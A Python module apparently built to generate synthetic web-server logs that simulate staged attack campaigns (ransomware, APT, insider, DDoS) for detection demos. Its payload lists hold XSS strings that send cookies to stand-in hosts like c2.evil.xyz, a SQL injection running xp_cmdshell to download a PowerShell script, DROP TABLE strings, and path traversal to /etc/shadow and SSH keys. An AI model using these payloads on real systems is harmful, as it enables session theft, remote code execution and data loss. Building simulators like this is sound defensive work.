"""
Scenario-based log generator.
Produces realistic attack campaigns that unfold over time,
plus a legacy random-batch mode for backwards compatibility.
"""
import random
from datetime import datetime, timedelta

# ── Diverse IP pools by origin ─────────────────────────────────────────────

_ATTACKER_IPS = {
    "RU":  ["5.18.12.34",  "77.73.64.201", "95.213.189.45", "185.234.218.7",
             "194.165.16.28", "212.193.30.100", "46.161.27.50", "82.146.33.9"],
    "CN":  ["1.180.0.147", "27.184.23.200", "58.218.199.45", "113.57.168.12",
             "121.41.88.222", "36.99.197.50", "49.52.100.12", "114.230.88.6",
             "222.184.9.10", "60.191.178.36"],
    "IR":  ["5.160.251.58", "78.109.32.44", "91.92.109.23", "185.177.232.18",
             "80.75.0.137", "185.141.60.100"],
    "KP":  ["175.45.176.3", "175.45.178.12", "210.52.109.22"],
    "NL":  ["185.220.101.34", "185.220.101.45", "185.220.100.255",
             "193.27.228.15", "45.142.212.100", "185.56.80.65"],
    "US":  ["104.21.50.12", "192.241.200.34", "198.199.104.187",
             "167.99.200.45", "157.230.88.12", "68.183.100.234"],
    "BR":  ["45.167.96.29", "177.22.88.34", "179.60.147.200", "189.36.34.55"],
    "IN":  ["103.43.75.118", "49.36.88.200", "122.177.40.3", "115.99.233.12"],
    "DE":  ["185.125.190.44", "80.187.128.33", "46.114.33.200"],
    "UA":  ["91.218.114.31", "176.103.58.44", "185.244.25.10"],
    "VN":  ["42.119.233.100", "113.190.235.12", "14.161.0.50"],
    "TR":  ["85.105.32.200", "78.187.180.44", "195.175.0.33"],
    "NG":  ["41.58.100.20", "197.242.88.34"],
    "PK":  ["119.73.133.45", "111.118.0.50"],
}

# Flatten for quick random picks
_ALL_ATTACKER_IPS = [ip for ips in _ATTACKER_IPS.values() for ip in ips]

_NORMAL_IPS = [
    "192.168.1.10",  "192.168.1.25",  "192.168.1.42",  "192.168.1.88",
    "192.168.1.130", "192.168.1.201", "10.0.0.15",     "10.0.0.23",
    "10.0.0.50",     "10.0.0.101",    "10.0.0.180",    "172.16.0.5",
    "172.16.0.19",   "172.16.0.77",   "172.16.1.22",   "172.16.2.100",
]

_INTERNAL_PIVOT_IPS = [
    "10.10.1.5", "10.10.1.12", "10.10.2.30", "10.10.3.80",
    "172.20.0.5", "172.20.0.11",
]

# ── Industry path pools ────────────────────────────────────────────────────

_PATHS = {
    "normal": [
        "/", "/dashboard", "/profile", "/settings", "/help",
        "/api/v1/users/self", "/api/v1/profile", "/api/v1/notifications",
        "/api/v1/accounts", "/api/v1/transactions",
        "/api/v1/products", "/api/v1/orders/self", "/api/v1/cart",
        "/api/v1/appointments", "/api/v1/reports",
        "/static/app.js", "/static/styles.css", "/favicon.ico",
    ],
    "sensitive": [
        "/admin", "/admin/users", "/admin/config", "/admin/logs",
        "/api/v1/admin/export", "/api/v1/admin/users", "/api/v1/admin/accounts",
        "/api/v1/billing/export", "/api/v1/customers/dump",
        "/etc/passwd", "/.env", "/.git/config", "/server-status",
        "/wp-admin", "/phpmyadmin", "/debug", "/actuator/env",
        "/api/v1/internal/config", "/.aws/credentials",
    ],
    "data": [
        "/api/v1/accounts?export=true", "/api/v1/users?limit=1000",
        "/api/v1/transactions?from=2020-01-01&format=csv",
        "/api/v1/customers/export", "/api/v1/reports/annual",
        "/api/v1/patients?all=true", "/api/v1/ehr/records?bulk=true",
        "/api/v1/orders?limit=5000&export=csv",
    ],
    "backup": [
        "/backup.zip", "/backup.tar.gz", "/db_backup.sql",
        "/www.zip", "/site_backup.tar", "/dump.sql",
        "/api/v1/backup/download", "/.git/HEAD",
    ],
    "recon": [
        "/robots.txt", "/.well-known/security.txt", "/sitemap.xml",
        "/crossdomain.xml", "/api/swagger.json", "/api/openapi.json",
        "/api/v1/version", "/api/health", "/_ah/api/discovery",
        "/api/v1/docs", "/swagger-ui.html", "/api-docs",
    ],
    "login": ["/login", "/api/v1/auth/login", "/auth/signin", "/api/v1/auth"],
}

_USER_SESSIONS = [
    ["/", "/login", "/dashboard", "/api/v1/notifications", "/api/v1/profile", "/settings"],
    ["/", "/api/v1/products", "/api/v1/cart", "/checkout", "/api/v1/orders/self"],
    ["/dashboard", "/api/v1/accounts", "/api/v1/transactions", "/api/v1/reports"],
    ["/", "/api/v1/appointments", "/api/v1/profile", "/settings", "/help"],
    ["/dashboard", "/api/v1/notifications", "/api/v1/users/self", "/api/v1/reports"],
]

_NORMAL_USERS = [
    "alice.morgan", "bob.chen", "charlie.davis", "diana.patel",
    "eve.rodriguez", "frank.kim", "grace.okonkwo", "henry.mueller",
    "iris.nakamura", "james.silva", "kate.martin", "liam.johnson",
    "maya.watson", "noah.garcia", "olivia.brown", "peter.smith",
]

_ADMIN_USERS = ["admin", "root", "sysadmin", "administrator", "devops", "ops"]

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/124.0.0.0",
    "python-requests/2.31.0",
    "axios/1.6.8",
    "Go-http-client/2.0",
]

_MALICIOUS_UAS = [
    "sqlmap/1.8.3#stable (https://sqlmap.org)",
    "Nikto/2.1.6 (Evasions:None)",
    "Nmap Scripting Engine; https://nmap.org/book/nse.html",
    "masscan/1.3.2 (https://github.com/robertdavidgraham/masscan)",
    "DirBuster-1.0-RC1 (https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)",
    "gobuster/3.6",
    "wfuzz/3.1.0",
    "Hydra/9.4 (https://github.com/vanhauser-thc/thc-hydra)",
    "metasploit/6.3.0 (https://www.metasploit.com/)",
    "ZAP/2.14.0 (https://www.zaproxy.org/)",
]

_XSS_PAYLOADS = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=fetch('//c2.evil.xyz/'+document.cookie)>",
    "javascript:eval(atob('YWxlcnQoMSk='))",
    "<svg/onload=navigator.sendBeacon('//exfil.xyz',document.cookie)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "%3Cscript%3Edocument.location='http://attacker.xyz/?c='+document.cookie%3C/script%3E",
    "<details open ontoggle=fetch('//c2.evil.xyz/hook.js').then(r=>r.text()).then(eval)>",
]

_SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' UNION SELECT username,password,email FROM users --",
    "'; DROP TABLE sessions; --",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
    "admin'--",
    "' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='users') --",
    "1; EXEC xp_cmdshell('powershell -c IEX(New-Object Net.WebClient).DownloadString(\"http://c2.evil.xyz/shell.ps1\")')--",
    "' UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables --",
    "1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'",
]

_PATH_TRAVERSAL = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fshadow",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "....//....//....//etc/passwd",
    "../../../../proc/self/environ",
    "..\\..\\..\\windows\\system32\\cmd.exe",
    "../../../../.ssh/id_rsa",
    "../../../../home/ubuntu/.bash_history",
]

# ── Timestamp helpers ──────────────────────────────────────────────────────

def _ts(base: datetime = None, spread: int = 120) -> str:
    if base is None:
        base = datetime.utcnow()
    offset = random.randint(-spread, spread)
    return (base + timedelta(seconds=offset)).isoformat() + "Z"

def _rapid_ts(count: int, base: datetime = None, window: int = 30) -> list:
    if base is None:
        base = datetime.utcnow()
    return sorted(
        [(base + timedelta(seconds=random.uniform(0, window))).isoformat() + "Z"
         for _ in range(count)]
    )

# ── Atomic log builders ────────────────────────────────────────────────────

def _normal(base=None, user=None, ip=None):
    session = random.choice(_USER_SESSIONS)
    path    = random.choice(session)
    return {
        "timestamp":   _ts(base, 180),
        "ip":          ip or random.choice(_NORMAL_IPS),
        "method":      "GET" if path.startswith("/static") else random.choice(["GET","GET","GET","POST"]),
        "path":        path,
        "status_code": random.choice([200, 200, 200, 201, 304]),
        "user_agent":  random.choice(_USER_AGENTS),
        "user":        user or random.choice(_NORMAL_USERS),
    }

def _login_fail(ip, user, base=None):
    return {
        "timestamp":   _ts(base, 10),
        "ip":          ip,
        "method":      "POST",
        "path":        random.choice(_PATHS["login"]),
        "status_code": 401,
        "user_agent":  random.choice(_USER_AGENTS + _MALICIOUS_UAS[:3]),
        "user":        user,
    }

def _login_ok(ip, user, base=None):
    return {**_login_fail(ip, user, base), "status_code": 200}

def _scan_request(ip, base=None):
    return {
        "timestamp":   _ts(base, 60),
        "ip":          ip,
        "method":      random.choice(["GET", "HEAD", "OPTIONS"]),
        "path":        random.choice(_PATHS["recon"] + _PATHS["sensitive"]),
        "status_code": random.choice([403, 403, 404, 401, 200]),
        "user_agent":  random.choice(_MALICIOUS_UAS),
        "user":        None,
    }

def _sqli_request(ip, base=None):
    payload  = random.choice(_SQLI_PAYLOADS)
    endpoint = random.choice(["/search?q=", "/api/v1/users?id=", "/login?user=",
                               "/api/v1/items?filter=", "/api/v1/products?category="])
    return {
        "timestamp":   _ts(base, 60),
        "ip":          ip,
        "method":      random.choice(["GET", "POST"]),
        "path":        endpoint + payload,
        "status_code": random.choice([500, 500, 200, 400]),
        "user_agent":  random.choice(_MALICIOUS_UAS[:4] + _USER_AGENTS[:2]),
        "user":        None,
    }

def _xss_request(ip, base=None):
    payload  = random.choice(_XSS_PAYLOADS)
    endpoint = random.choice(["/search?q=", "/comment?text=", "/api/v1/messages?body=", "/feedback?msg="])
    return {
        "timestamp":   _ts(base, 60),
        "ip":          ip,
        "method":      random.choice(["GET", "POST"]),
        "path":        endpoint + payload,
        "status_code": random.choice([200, 200, 400, 500]),
        "user_agent":  random.choice(_USER_AGENTS + _MALICIOUS_UAS),
        "user":        None,
    }

def _traversal_request(ip, base=None):
    payload  = random.choice(_PATH_TRAVERSAL)
    endpoint = random.choice(["/download?file=", "/static/", "/api/v1/file?name=", "/read?path="])
    return {
        "timestamp":   _ts(base, 60),
        "ip":          ip,
        "method":      "GET",
        "path":        endpoint + payload,
        "status_code": random.choice([200, 403, 404, 500]),
        "user_agent":  random.choice(_MALICIOUS_UAS + _USER_AGENTS[:2]),
        "user":        None,
    }

def _data_access(ip, user, base=None):
    return {
        "timestamp":   _ts(base, 30),
        "ip":          ip,
        "method":      "GET",
        "path":        random.choice(_PATHS["data"]),
        "status_code": random.choice([200, 200, 206]),
        "user_agent":  random.choice(_USER_AGENTS),
        "user":        user,
    }

def _flood_request(ip, base=None):
    return {
        "timestamp":   _ts(base, 5),
        "ip":          ip,
        "method":      random.choice(["GET", "GET", "POST"]),
        "path":        random.choice(_PATHS["normal"] + _PATHS["sensitive"]),
        "status_code": random.choice([200, 429, 503, 200]),
        "user_agent":  random.choice(_USER_AGENTS + _MALICIOUS_UAS),
        "user":        None,
    }

# ── Phase generators ───────────────────────────────────────────────────────

def _phase_recon(count, base, attacker_ip):
    """Quiet recon — port probing, robots.txt, version endpoints."""
    return [_scan_request(attacker_ip, base) for _ in range(count)]

def _phase_brute_force(count, base, attacker_ip):
    """Rapid login failures targeting admin accounts."""
    target = random.choice(_ADMIN_USERS + _NORMAL_USERS[:4])
    ts_list = _rapid_ts(count, base, window=40)
    logs = [_login_fail(attacker_ip, target, None) for _ in range(count)]
    for i, log in enumerate(logs):
        log["timestamp"] = ts_list[i]
    if random.random() < 0.25:
        logs[-1]["status_code"] = 200
    return logs

def _phase_lateral_move(count, base, attacker_ip):
    """Attacker uses compromised internal IP to pivot."""
    pivot_ip = random.choice(_INTERNAL_PIVOT_IPS)
    logs = []
    for _ in range(count):
        if random.random() < 0.6:
            logs.append(_scan_request(pivot_ip, base))
        else:
            # Try to access admin from inside
            log = _scan_request(pivot_ip, base)
            log["path"] = random.choice(_PATHS["sensitive"])
            logs.append(log)
    return logs

def _phase_credential_stuffing(count, base, attacker_ip):
    """Try many different usernames from a leaked list."""
    users = _NORMAL_USERS + _ADMIN_USERS + [
        "j.doe", "m.smith", "user123", "test_admin", "service_acct",
        "backup_user", "monitor", "helpdesk", "support", "noreply",
    ]
    ts_list = _rapid_ts(count, base, window=50)
    logs = []
    for i in range(count):
        user = random.choice(users)
        log = _login_fail(attacker_ip, user, None)
        log["timestamp"] = ts_list[i]
        if random.random() < 0.04:
            log["status_code"] = 200
        logs.append(log)
    return logs

def _phase_data_staging(count, base, attacker_ip, user=None):
    """Bulk data downloads — exfil prep."""
    u = user or random.choice(_NORMAL_USERS[:4])
    return [_data_access(attacker_ip, u, base) for _ in range(count)]

def _phase_pre_encryption(count, base, attacker_ip):
    """Shadow copy deletion simulation, rapid file access, backup tampering."""
    logs = []
    backup_paths = _PATHS["backup"]
    for _ in range(count):
        path = random.choice(backup_paths + _PATHS["data"])
        method = "DELETE" if random.random() < 0.35 else "GET"
        logs.append({
            "timestamp":   _ts(base, 20),
            "ip":          attacker_ip,
            "method":      method,
            "path":        path,
            "status_code": random.choice([200, 204, 403, 500]),
            "user_agent":  random.choice(_USER_AGENTS),
            "user":        random.choice(_ADMIN_USERS),
        })
    return logs

def _phase_slow_apt(count, base, attacker_ip):
    """APT: very few requests, carefully chosen, normal-looking UA."""
    logs = []
    for _ in range(min(count, 3)):   # APT is low-volume by design
        r = random.random()
        if r < 0.4:
            logs.append(_traversal_request(attacker_ip, base))
        elif r < 0.7:
            logs.append(_sqli_request(attacker_ip, base))
        else:
            log = _scan_request(attacker_ip, base)
            log["user_agent"] = random.choice(_USER_AGENTS)  # blend in
            logs.append(log)
    # Pad with normal traffic to hide in noise
    while len(logs) < count:
        logs.append(_normal(base))
    return logs

def _phase_apt_persistence(count, base, attacker_ip):
    """APT planting a foothold — accessing config, creating scheduled tasks."""
    config_paths = [
        "/api/v1/admin/cron", "/api/v1/admin/webhooks", "/api/v1/admin/config",
        "/api/v1/jobs/create", "/api/v1/hooks", "/api/v1/admin/integrations",
    ]
    logs = []
    for _ in range(count):
        logs.append({
            "timestamp":   _ts(base, 60),
            "ip":          attacker_ip,
            "method":      random.choice(["POST", "PUT", "PATCH"]),
            "path":        random.choice(config_paths),
            "status_code": random.choice([200, 201, 403]),
            "user_agent":  random.choice(_USER_AGENTS),
            "user":        random.choice(_ADMIN_USERS),
        })
    return logs

def _phase_insider(count, base, insider_ip, insider_user):
    """Legitimate user accessing sensitive data outside their scope."""
    r = random.random()
    paths = _PATHS["sensitive"] if r < 0.5 else _PATHS["data"]
    logs = []
    for _ in range(count):
        log = _normal(base, user=insider_user, ip=insider_ip)
        if random.random() < 0.6:
            log["path"]        = random.choice(paths)
            log["status_code"] = random.choice([200, 200, 403])
        logs.append(log)
    return logs

def _phase_ddos(count, base, flood_ips):
    """Multi-IP HTTP flood."""
    ts_list = _rapid_ts(count, base, window=8)
    logs = []
    for ts in ts_list:
        log = _flood_request(random.choice(flood_ips), None)
        log["timestamp"] = ts
        logs.append(log)
    return logs

def _phase_ddos_cover_exploit(count, base, attacker_ip):
    """SQLi / path traversal under DDoS cover."""
    logs = []
    for _ in range(count):
        if random.random() < 0.5:
            logs.append(_sqli_request(attacker_ip, base))
        else:
            logs.append(_traversal_request(attacker_ip, base))
    return logs

# ── Scenario definitions ───────────────────────────────────────────────────
#
# Each phase: {name, desc, batches, fn}
# fn(count, base, **ctx) → list[log]
#

SCENARIO_CATALOG = {
    "ransomware": {
        "label":       "Ransomware Pre-Stage",
        "description": "Full kill chain: recon → brute force → lateral movement → data staging → pre-encryption",
        "duration_min": 8,
        "phases": [
            {"name": "Reconnaissance",        "desc": "Automated scanner probing endpoints and server info",       "batches": 15},
            {"name": "Credential Attack",      "desc": "Brute-force targeting admin and privileged accounts",       "batches": 25},
            {"name": "Lateral Movement",       "desc": "Compromised internal host pivoting through the network",    "batches": 20},
            {"name": "Data Staging",           "desc": "Bulk data access — collecting files before encryption",     "batches": 25},
            {"name": "Pre-Encryption",         "desc": "Shadow copy deletion, backup tampering, rapid file access", "batches": 35},
        ],
    },
    "apt": {
        "label":       "APT Campaign",
        "description": "Advanced Persistent Threat — slow, stealthy, multi-stage. Low noise, high damage.",
        "duration_min": 12,
        "phases": [
            {"name": "Low-and-Slow Recon",   "desc": "Minimal footprint scanning — blends with normal traffic",    "batches": 60},
            {"name": "Initial Compromise",   "desc": "Targeted SQLi / path traversal on key endpoints",            "batches": 50},
            {"name": "Persistence",          "desc": "Installing backdoor via config API — webhooks, cron jobs",   "batches": 40},
            {"name": "Data Exfiltration",    "desc": "Slow, incremental bulk data access over many sessions",      "batches": 90},
        ],
    },
    "webapp": {
        "label":       "Web App Penetration",
        "description": "Automated web attack: fuzzing → SQLi → admin bypass → DB dump",
        "duration_min": 5,
        "phases": [
            {"name": "Directory Fuzzing",  "desc": "DirBuster-style path enumeration to map the application",    "batches": 20},
            {"name": "SQL Injection",      "desc": "Automated SQLi probing across all input vectors",            "batches": 25},
            {"name": "Admin Bypass",       "desc": "Exploiting SQLi to authenticate as administrator",          "batches": 20},
            {"name": "Database Dump",      "desc": "Union-based extraction of users, passwords, PII tables",     "batches": 35},
        ],
    },
    "insider": {
        "label":       "Insider Threat",
        "description": "Trusted user gradually exceeds their access scope — subtle, difficult to detect.",
        "duration_min": 10,
        "phases": [
            {"name": "Normal Behavior",   "desc": "Establishing a baseline of legitimate user activity",       "batches": 50},
            {"name": "Scope Creep",       "desc": "Accessing data adjacent to their role — borderline normal",  "batches": 40},
            {"name": "Privilege Escalation", "desc": "Attempting admin paths with valid session credentials",  "batches": 35},
            {"name": "Data Exfiltration", "desc": "Bulk export of sensitive records before resignation",       "batches": 75},
        ],
    },
    "ddos": {
        "label":       "DDoS + Exploit",
        "description": "HTTP flood from botnet while attacker exploits distracted defenders",
        "duration_min": 6,
        "phases": [
            {"name": "Target Identification", "desc": "Identifying high-value endpoints for the flood",         "batches": 15},
            {"name": "HTTP Flood",            "desc": "Layer-7 DDoS from 6 botnet IPs — overwhelming load balancer", "batches": 50},
            {"name": "Cover Exploitation",    "desc": "SQLi + path traversal under cover of DDoS noise",       "batches": 55},
        ],
    },
}


class ScenarioRunner:
    """Stateful scenario runner — call next_batch() each tick."""

    def __init__(self, scenario_name: str):
        self.name      = scenario_name
        self.catalog   = SCENARIO_CATALOG[scenario_name]
        self.phases    = self.catalog["phases"]
        self.phase_idx = 0
        self.batch_in_phase = 0
        self.total_batches  = 0

        # Scenario-specific persistent actors
        self._attacker_ip     = random.choice(_ALL_ATTACKER_IPS)
        self._secondary_ip    = random.choice(_ALL_ATTACKER_IPS)
        self._insider_user    = random.choice(_NORMAL_USERS)
        self._insider_ip      = random.choice(_NORMAL_IPS)
        self._flood_ips       = random.sample(_ALL_ATTACKER_IPS, min(6, len(_ALL_ATTACKER_IPS)))
        self._compromised_user = random.choice(_NORMAL_USERS)

    # ── public ────────────────────────────────────────────────────────────

    def get_phase_info(self) -> dict:
        if self.phase_idx >= len(self.phases):
            return self._make_info(completed=True)
        p = self.phases[self.phase_idx]
        progress = (self.batch_in_phase / max(p["batches"], 1)) * 100
        return {
            "scenario":      self.name,
            "scenario_label": self.catalog["label"],
            "phase_index":   self.phase_idx,
            "phase_count":   len(self.phases),
            "phase_name":    p["name"],
            "phase_desc":    p["desc"],
            "progress":      round(progress),
            "completed":     False,
            "phase_changed": False,
        }

    def next_batch(self, count: int = 15) -> tuple:
        """Returns (logs, phase_info). phase_info.phase_changed=True on transition."""
        base = datetime.utcnow()

        # Loop scenario when done
        if self.phase_idx >= len(self.phases):
            self.phase_idx = 0
            self.batch_in_phase = 0
            self._attacker_ip = random.choice(_ALL_ATTACKER_IPS)

        phase = self.phases[self.phase_idx]
        logs  = self._generate_for_phase(self.phase_idx, count, base)

        # Mix in some normal traffic for realism
        normal_ratio = self._normal_ratio()
        normal_count = int(count * normal_ratio)
        logs = random.sample(logs, max(0, len(logs) - normal_count)) + \
               [_normal(base) for _ in range(normal_count)]
        random.shuffle(logs)

        self.batch_in_phase += 1
        self.total_batches  += 1

        info         = self.get_phase_info()
        phase_changed = False

        if self.batch_in_phase >= phase["batches"]:
            self.phase_idx     += 1
            self.batch_in_phase = 0
            phase_changed       = True

        info["phase_changed"] = phase_changed
        if phase_changed and self.phase_idx < len(self.phases):
            info["next_phase_name"] = self.phases[self.phase_idx]["name"]
            info["next_phase_desc"] = self.phases[self.phase_idx]["desc"]

        return logs, info

    def reset(self):
        self.__init__(self.name)

    # ── private ───────────────────────────────────────────────────────────

    def _normal_ratio(self) -> float:
        """APT hides in noise; other scenarios are more obvious."""
        ratios = {"apt": 0.70, "insider": 0.55, "ddos": 0.10,
                  "webapp": 0.20, "ransomware": 0.25}
        return ratios.get(self.name, 0.30)

    def _generate_for_phase(self, idx: int, count: int, base: datetime) -> list:
        n = self.name
        ai = self._attacker_ip

        if n == "ransomware":
            gen = [
                lambda c, b: _phase_recon(c, b, ai),
                lambda c, b: _phase_brute_force(c, b, ai),
                lambda c, b: _phase_lateral_move(c, b, ai),
                lambda c, b: _phase_data_staging(c, b, ai, self._compromised_user),
                lambda c, b: _phase_pre_encryption(c, b, ai),
            ]
        elif n == "apt":
            gen = [
                lambda c, b: _phase_slow_apt(c, b, ai),
                lambda c, b: _phase_slow_apt(c, b, ai) + [_sqli_request(ai, b)],
                lambda c, b: _phase_apt_persistence(c, b, ai),
                lambda c, b: _phase_data_staging(c, b, ai, self._compromised_user),
            ]
        elif n == "webapp":
            gen = [
                lambda c, b: _phase_recon(c, b, ai),
                lambda c, b: [_sqli_request(ai, b) for _ in range(c)],
                lambda c, b: [_sqli_request(ai, b) for _ in range(c)],
                lambda c, b: _phase_data_staging(c, b, ai) + [_sqli_request(ai, b)],
            ]
        elif n == "insider":
            gen = [
                lambda c, b: [_normal(b, self._insider_user, self._insider_ip) for _ in range(c)],
                lambda c, b: _phase_insider(c, b, self._insider_ip, self._insider_user),
                lambda c, b: _phase_insider(c, b, self._insider_ip, self._insider_user),
                lambda c, b: _phase_data_staging(c, b, self._insider_ip, self._insider_user),
            ]
        elif n == "ddos":
            gen = [
                lambda c, b: _phase_recon(c, b, ai),
                lambda c, b: _phase_ddos(c, b, self._flood_ips),
                lambda c, b: _phase_ddos(c // 2, b, self._flood_ips) +
                             _phase_ddos_cover_exploit(c - c // 2, b, self._secondary_ip),
            ]
        else:
            return [_normal(base) for _ in range(count)]

        safe_idx = min(idx, len(gen) - 1)
        return gen[safe_idx](count, base)

    @staticmethod
    def _make_info(completed=False) -> dict:
        return {
            "scenario": None, "scenario_label": None,
            "phase_index": 0, "phase_count": 0,
            "phase_name": None, "phase_desc": None,
            "progress": 100, "completed": completed,
            "phase_changed": False,
        }


# ── Legacy random batch mode (backwards compatible) ───────────────────────

def generate_log_batch(count: int = 50, attack_ratio: float = 0.3) -> list:
    """Random mixed batch — normal traffic + random attack types."""
    base         = datetime.utcnow()
    normal_count = int(count * (1 - attack_ratio))
    logs         = [_normal(base) for _ in range(normal_count)]

    attack_count = count - normal_count
    attacker_ip  = random.choice(_ALL_ATTACKER_IPS)

    generators = [
        lambda c, b: _phase_brute_force(c, b, attacker_ip),
        lambda c, b: [_sqli_request(attacker_ip, b) for _ in range(c)],
        lambda c, b: [_scan_request(attacker_ip, b) for _ in range(c)],
        lambda c, b: [_xss_request(attacker_ip, b) for _ in range(c)],
        lambda c, b: [_traversal_request(attacker_ip, b) for _ in range(c)],
        lambda c, b: _phase_credential_stuffing(c, b, attacker_ip),
        lambda c, b: _phase_ddos(c, b, [attacker_ip]),
        lambda c, b: _phase_data_staging(c, b, attacker_ip),
    ]

    remaining = attack_count
    while remaining > 0:
        gen        = random.choice(generators)
        batch_size = min(remaining, random.randint(3, 8))
        logs.extend(gen(batch_size, base))
        remaining -= batch_size

    random.shuffle(logs)
    return logs
